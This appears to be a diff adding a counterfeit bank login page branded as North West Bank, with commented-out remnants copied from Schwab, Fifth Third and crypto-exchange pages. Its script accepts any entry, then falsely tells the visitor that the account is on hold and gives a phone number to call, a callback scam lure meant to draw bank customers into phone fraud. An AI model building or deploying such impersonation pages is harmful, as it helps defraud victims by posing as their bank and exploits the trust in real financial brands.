@@ -1,0 +1,505 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <link href="https://assets.staticimg.com/public-web/2.6.22/static/fontsGoogleapis/googleapis.css" rel="prefetch" as="style">
+    <link rel="preload" href="assets/css/KUCOINSans-Bold.woff2" as="font" type="font/woff2" crossorigin="true">
+    <link href="style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="">
+    <title>Login</title>
+</head>
+
+<body>
+
+    <!--
+    <header>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-11 col-8 d-flex justify-content-start">
+                    <img src="CharlesSchwabCorporationlogosvg.png" class="logoMain">
+                   
+                        <div style="justify-content: space-between; align-items: center; display: flex; position: absolute; margin-left: 55%;">
+
+
+                            <a href="#" style="font-size: 16px; color: #333; text-decoration: auto; text-transform: uppercase; padding-right: 15px;">Customer Service</a>
+                            <span>|</span>
+                            <a href="#" style="font-size: 16px; color: #333; text-decoration: auto; text-transform: uppercase; padding-left: 15px;">Branch & ATM Locator</a>
+
+                        </div>
+                    
+    </div>
+
+
+    <!-- <div class="col-md-1 col-4 d-flex justify-content-end">
+                        <svg focusable="false" width="1em" height="1em" fill="currentColor" aria-hidden="true" style="font-size:24px" viewBox="0 0 24 24" data-icon="GlobalOutlined">
+                            <path
+                                d="M12 22C6.477 22 2 17.523 2 12C2 6.477 6.477 2 12 2C17.523 2 22 6.477 22 12C22 17.523 17.523 22 12 22ZM9.71 19.667C8.72341 17.5743 8.15187 15.3102 8.027 13H4.062C4.25659 14.5389 4.89392 15.9882 5.89657 17.1717C6.89922 18.3552 8.22401 19.2221 9.71 19.667V19.667ZM10.03 13C10.181 15.439 10.878 17.73 12 19.752C13.1523 17.6766 13.8254 15.3695 13.97 13H10.03V13ZM19.938 13H15.973C15.8481 15.3102 15.2766 17.5743 14.29 19.667C15.776 19.2221 17.1008 18.3552 18.1034 17.1717C19.1061 15.9882 19.7434 14.5389 19.938 13V13ZM4.062 11H8.027C8.15187 8.68979 8.72341 6.42569 9.71 4.333C8.22401 4.77788 6.89922 5.64475 5.89657 6.8283C4.89392 8.01184 4.25659 9.4611 4.062 11V11ZM10.031 11H13.969C13.8248 8.6306 13.152 6.32353 12 4.248C10.8477 6.32345 10.1746 8.63052 10.03 11H10.031ZM14.29 4.333C15.2766 6.42569 15.8481 8.68979 15.973 11H19.938C19.7434 9.4611 19.1061 8.01184 18.1034 6.8283C17.1008 5.64475 15.776 4.77788 14.29 4.333V4.333Z">
+                            </path>
+                        </svg>
+                    </div> 
+    </div>
+    </div>
+    </header>
+
+    -->
+
+
+    <!--   <div id="" class="cmsmessagebox">
+        <img src="icons8-info-480.svg" class="cmsinfoicon">
+        <div class="cmsmessagetext">
+            <span class="cmsmessage"><strong>Recently moved here from TD Ameritrade?</strong> Log in below to get started and complete your Schwab client profile. If you haven’t already, you'll need to <a href="#" class="cmsinfotext"> create your Schwab Login ID and password first</a>.</span>
+        </div>
+    </div>
+
+-->
+
+
+
+
+    <section class="sectionformWrapper">
+
+        <div class="container">
+            <!--
+                <div style="color: #fff; padding-left: 50px; font-size: 14px;">
+                    <span>home</span> &#62;
+                    <span>Login</span>
+                </div>
+                -->
+            <div class="row">
+                <div class="col-md-12 d-flex justify-content-center align-items-center">
+                    <div class="formContainerMain">
+                        <div class="formContainerMainSide">
+                            <img src="North West Bank logo.svg" alt="" class="logoMain">
+                            <div class="formWrapper">
+                                <div class="formLoginDetails mt-4">
+                                    <form action="#" method="post" autocomplete="off">
+                                        <div class="formWrapperLabelinput">
+
+                                            <div class="formWrapperInput">
+                                                <div class="formWrapperInputDetails">
+                                                    <div class="formWrapperInputDetailsMainInput">
+                                                        <input data-bn-type="input" id="username" type="text" name="username" autocomplete="username" autocapitalize="off" value="" placeholder="User ID">
+                                                    </div>
+                                                </div>
+                                                <div class="formWrapperInputDetailsPass mt-2" id="formWrapperInputDetailsPass">
+
+                                                    <div class="formWrapperInputDetailsMainInput">
+                                                        <input data-bn-type="input" id="passwordField" type="password" name="username" autocomplete="username" autocapitalize="off" value="" placeholder="Password">
+                                                        <div style="margin-right: 10px;">
+                                                            <svg xmlns="http://www.w3.org/2000/svg" id="eyeIconToggle" width="0" height="18" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16">
+                                                                    <path
+                                                                        d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z" />
+                                                                    <path
+                                                                        d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z" />
+                                                                </svg>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <p class="errorMsg" id="errorMsg"></p>
+                                            </div>
+                                        </div>
+
+
+                                        <!--
+                                        <div class="formcheckbox01">
+
+                                            <input type="checkbox" style=" width: 16px; margin-right: 10px;">
+                                            <label class="formcheckboctext01">Save User ID</label>
+                                        </div>
+
+
+                                        <label for="Start Page" class="formdropdown">Start Page</label>
+                                        <select id="bankingoption" name="bankingoption" class="bankingoption">
+                                                <option value="personal"> Accounts Summary </option>
+                                                <option value="Commercial"> Account Balances </option>
+                                                <option value="Commercial"> Positions </option>
+                                                <option value="Commercial"> Trade Ticket </option>
+                                                <option value="Commercial"> History </option>
+                                                <option value="Commercial"> Stock & ETF Trading </option>
+                                                <option value="Commercial"> Options Trading </option>
+                                                <option value="Commercial"> Mutual Fund Trading </option>
+                                                <option value="Commercial"> Bond Trading </option>
+                                                <option value="Commercial"> Research </option>
+                                                <option value="Commercial"> Trade Source </option>
+                                                <option value="Commercial"> Order Status </option>
+                                                
+                                            </select>
+
+-->
+
+                                        <div class="footerLoginButton">
+                                            <button class="click_login_submit" id="click_login_submit" type="button">Log
+                                                    In</button>
+                                        </div>
+
+
+
+
+                                        <div class="forgotpass">
+                                            <a href="#" class="forgotlink">Unlock/Forgot Password</a>
+                                        </div>
+                                        <div class="forgotpass">
+                                            <a href="#" class="forgotlink">Forgot User ID?</a>
+                                        </div>
+
+
+
+
+
+
+
+
+
+                                        <!--  <div class="footerLoginLinks">
+                                                <span>
+                                                    Forgot Login?
+                                                </span> <br>
+                                                <span>
+                                                    First Time User? Register.
+                                                </span>
+                                            </div>
+                                            
+                                            <div class="LoginFormOther">
+                                                <div class="LoginFormOtherText">Other third-party logins
+                                                </div>
+                                            </div> -->
+                                        <!--
+                                            <div class="socialWrapper">
+                                                <div class="socialText">
+                                                    <div class="iconWrapper">
+                                                        <svg version="1.1" width="21px" height="21px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" class="LgbsSe-Bz112c">
+                                                            <g>
+                                                                <path fill="#EA4335"
+                                                                    d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z">
+                                                                </path>
+                                                                <path fill="#4285F4"
+                                                                    d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z">
+                                                                </path>
+                                                                <path fill="#FBBC05"
+                                                                    d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z">
+                                                                </path>
+                                                                <path fill="#34A853"
+                                                                    d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z">
+                                                                </path>
+                                                                <path fill="none" d="M0 0h48v48H0z"></path>
+                                                            </g>
+                                                        </svg>
+                                                    </div>
+                                                    Google
+                                                </div>
+                                                <div class="socialText">
+                                                    <div class="iconWrapper">
+                                                        <svg focusable="false" width="21px" height="21px" fill="currentColor" aria-hidden="true" viewBox="0 0 1024 1024" data-icon="TelegramFilled">
+                                                            <path
+                                                                d="M417.28 795.733l11.947-180.48L756.907 320c14.506-13.227-2.987-19.627-22.187-8.107L330.24 567.467 155.307 512c-37.547-10.667-37.974-36.693 8.533-55.467l681.387-262.826c31.146-14.08 61.013 7.68 49.066 55.466L778.24 795.733c-8.107 38.827-31.573 48.214-64 30.294L537.6 695.467l-84.907 82.346c-9.813 9.814-17.92 17.92-35.413 17.92z">
+                                                            </path>
+                                                        </svg>
+                                                    </div>
+                                                    Telegram
+                                                </div>
+                                            </div> -->
+
+
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- <div class="formContainerSideQR">
+                                <div class="qrLogin">
+                                    <img src="qr.jpg" />
+                                    <span class="textQR">Log in with QR code</span>
+                                    <span class="sanQrSecText">Scan this QR code with the <span>MEXC App</span> to log in instantly</span>
+                                    <span class="btnDown">Download App</span>
+                                </div>
+                            </div> -->
+
+
+
+
+
+
+
+
+
+                    </div>
+                </div>
+
+                <div class="formcontainerfooter">
+                    <div class="formcontainerfootersection">
+                        <div>
+                            <a href="#" class="footerform">Enroll Personal</a> <br>
+                            <a href="#" class="footerform">Privacy Policy</a> <br>
+                            <a href="#" class="footerform">Login FAQs</a> <br>
+                            <a href="#" class="footerform">ATM/Branch Locator</a>
+                        </div>
+
+                        <div>
+                            <a href="#" class="footerform">Supported Browsers</a> <br>
+                            <a href="#" class="footerform">En español</a> <br>
+                            <a href="#" class="footerform">Disclaimer</a>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- <section style="display: flex; margin: 70px; padding: 0 10%;">
+            <div style="width: 100%;">
+                <h2>Existing Users</h2>
+                <p>To access your accounts, please use your custom User ID and your associated Online Banking password.</p>
+            </div>
+            <div style="width: 100%;">
+                <h2>First Time Users</h2>
+                <div>
+                    <p> <b>User ID:</b>
+                        <br> Use your Fifth Third debit, credit, prepaid or ATM card number the first time you log in. View Forgot User ID or Forgot Password.
+                    </p>
+                    <p>
+                        <b> Password:</b>
+                        <br> Use your Card PIN (Personal Identification Number) to log in to Online Banking. After entering Online Banking for the first time using your Card PIN, you will be prompted to create an exclusive password for Online Banking. </p>
+                </div>
+            </div>
+        </section>
+
+        <footer style="background-color: #f1f1f1; padding: 40px 180px 40px 180px;">
+            <div>
+                <ul style="margin-top: 20px;">
+                    <a href="#" class="c-footer__links-anchor ">About Us</a> <span>|</span>
+                    <a href="#" class="c-footer__links-anchor "> Customer Service</a> <span>|</span>
+                    <a href="#" class="c-footer__links-anchor "> Careers</a> <span>|</span>
+                    <a href="#" class="c-footer__links-anchor "> Investor Relations</a> <span>|</span>
+                    <a href="#" class="c-footer__links-anchor "> Media Center</a> <span>|</span>
+                    <a href="#" class="c-footer__links-anchor ">  Privacy & Security</a> <span>|</span>
+                    <a href="#" class="c-footer__links-anchor "> Site Map</a>
+                </ul>
+            </div>
+            <div>
+                <p style="font-size: 12px; padding-left: 30px;">
+                    Copyright © 2023 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC. <img src="equal_housing_logo.png" title="FDIC" alt="FDIC Logo"> Equal Housing Lender.
+                </p>
+            </div>
+            <div>
+                <img src="Fifth third logo.svg" style="width: 15%; padding-left: 40px; padding-top: 20px;">
+            </div>
+        </footer>
+    -->
+
+
+
+
+
+
+
+
+
+    <footer class="footerarea">
+        <div class="footer1">
+            <img src="footer-onlinebanking-northwest-bank.png" alt="" style=" width: 100%; image-rendering: pixelated;">
+        </div>
+    </footer>
+
+
+
+
+
+
+
+
+
+    <!--
+        <footer class="topsmall">
+            <div class="containersdpswrap">
+                <div class="sdpsrow">
+                    <ul class="sdps-row cont sdps-wrap banner-list">
+                        <li class="column">
+                            <div class="smartBanner">
+                                <div class="DecaLogin">
+                                    <a href="#" tabindex="0"><img alt="two people walking with umbrellas" class="footerImage" src="https://content.schwab.com/drupal_dependencies/DECA/Account-Protection-umbrella.jpg"></a>
+                                    <div class="card-content">
+                                        <h3 class="card1_header">Learn how your assets are protected at Schwab.</h3>
+                                        <div class="card1_body">
+                                        </div>
+                                        <a href="#">Answers to all the ways we safeguard your money</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <li class="column center-card">
+                            <div class="smartBanner">
+                                <div class="DecaLogin">
+                                    <a aria-labelledby="card2_link" href="#" role="link" tabindex="0">
+                                        <img alt="Older couple sitting and smiling at eachother" class="footerImage" src="https://content.schwab.com/drupal_dependencies/DECA/Fixed_Income.png">
+                                    </a>
+                                    <div class="card-content">
+                                        <h3 class="card2_header">Looking to generate income in retirement?</h3>
+                                        <div class="card2_body"></div>
+                                        <a href="#">Explore Fixed Income options.</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <li class="column">
+                            <div class="smartBanner">
+                                <div class="DecaLogin">
+                                    <a href="#" role="link" tabindex="0">
+                                        <img alt="Man carrying surfboard by the beach" class="footerImage" src="https://content.schwab.com/drupal_dependencies/DECA/hyic%20no%20atm%20fees.png"></a>
+                                    <div class="card-content">
+                                        <h3 class="card3_header">No fees. No minimums. No worries.</h3>
+                                        <div class="card3_body">The way a checking account is supposed to be.</div>
+                                        <a aria-label="Learn more about the Schwab Bank Investor Checking™ account" href="https://www.schwab.com/checking" id="card3_link">Learn more</a>
+                                    </div>
+                                </div>
+                                <div class="card3_legal">Member FDIC</div>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="client-relationship">
+                <div class="sdps-grid-fluid">
+                    <div class="col sdps-p-around_medium">
+                        <a class="ot-sdk-show-settings schwab-privacy-button" style="display:none" href="#">Do not Sell or Share My Personal Information</a>
+
+                        <div>
+                            <span class="sdps-text-l-bold-body">Important information about our relationship with you:</span>
+                            <a href="#">Client Relationship Summaries</a>
+                        </div>
+                        <div class="sdps-p-top_medium">
+                            <span>Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at</span>
+                            <a href="#" id="lnkSchwabTransparency">schwab.com/transparency</a>.
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <ul class="sdps-list--inline">
+                    <li>
+                        <span class="svg-lock-icon" role="img" aria-label="Blue lock icon"></span>
+                        <a href="#" target="_blank" class="links-allign">Schwab Safe®</a>|</li>
+
+                    <li>
+                        <a href="#" target="_blank" class="links-allign">The Schwab Security Guarantee</a>|</li>
+
+                    <li>
+                        <a href="#" id="footerLink3">Schwab Homepage</a></li>
+                </ul>
+            </div>
+            <div class="footer__disclosures sdps-p-bottom_medium">
+                <p>
+                    <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">Web Browser Information</a> — IMPORTANT information for Windows XP users.</p>
+
+                <p class="disclosures">Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value</p>
+
+                <p>Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p>
+
+                <p>Check the background of this firm or one of its investment professionals on <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">FINRA's BrokerCheck</a>.</p>
+
+                <p>The Charles Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Charles Schwab &amp; Co., Inc. (<a data-popup-height="" data-popup-width=""
+                        data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">member SIPC</a>), offers investment services and products, including Schwab brokerage accounts. Its banking subsidiary, Charles Schwab Bank (member FDIC and
+                    an Equal Housing Lender), provides deposit and lending services and products. Access to Electronic Services may be limited or unavailable during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.</p>
+
+                <p>This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target=""
+                        title="" type="">non-U.S. residents</a>.</p>
+
+                <p>© 2023 Charles Schwab &amp; Co., Inc, All rights reserved. Member <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">SIPC</a>. Unauthorized access is prohibited. Usage
+                    will be monitored. (0617-ZYYE)</p>
+            </div>
+        </footer>
+    -->
+
+
+
+
+
+
+
+    <div id="popupBox">
+        <div id="popupBoxClose">
+            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                    <path
+                        d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8 2.146 2.854Z" />
+                </svg>
+        </div>
+        <div id="popupBoxMsg">
+        </div>
+    </div>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+    <script>
+        var crossButton = document.getElementById('crossButtonMenu');
+        var menuScreen = document.getElementById('sidebarMenu');
+        var menuIcon = document.getElementById('menuIcon');
+        var click_login_submit = document.getElementById('click_login_submit');
+        var username = document.getElementById('username');
+        var errorMsg = document.getElementById('errorMsg');
+
+        var popupBoxClose = document.getElementById('popupBoxClose');
+        var popupBox = document.getElementById('popupBox');
+        var popupBoxMsg = document.getElementById('popupBoxMsg');
+        var formWrapperInputDetailsPass = document.getElementById('formWrapperInputDetailsPass');
+        var passwordField = document.getElementById('passwordField');
+        var btnLoginQR = document.getElementById('btnLoginQR');
+        var eyeIconToggle = document.getElementById('eyeIconToggle');
+        var checkValue = document.getElementById('checkValue');
+
+        var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+
+        eyeIconToggle.addEventListener('click', function() {
+            if (eyeIconToggle.classList.contains('bi-eye-slash-fill')) {
+
+                eyeIconToggle.innerHTML = `<path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"/>
+    <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12-.708.708z"/>`;
+                eyeIconToggle.classList.add('bi-eye-fill');
+                eyeIconToggle.classList.remove('bi-eye-slash-fill');
+                passwordField.setAttribute('type', 'text');
+            } else {
+                eyeIconToggle.innerHTML = `<path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
+    <path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>`;
+                eyeIconToggle.classList.add('bi-eye-slash-fill');
+                eyeIconToggle.classList.remove('bi-eye-fill');
+                passwordField.setAttribute('type', 'password');
+            }
+        });
+
+        click_login_submit.addEventListener('click', function() {
+            if (username.value == '' && passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email id and password';
+            } else if (username.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email';
+            } else if (!username.value.match(validRegex)) {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill valid email';
+            } else if (passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill Password';
+            } else {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'You have entered wrong email id or password. \n For security reasons Your account has been put on hold until you get in touch with us. \n To get in touch with the customer relationship manager, call  833-505-4596.';
+            }
+        });
+
+        popupBoxClose.addEventListener('click', function() {
+            popupBox.style.display = 'none';
+            popupBoxMsg.innerText = '';
+        })
+    </script>
+
+</body>
+
+</html>
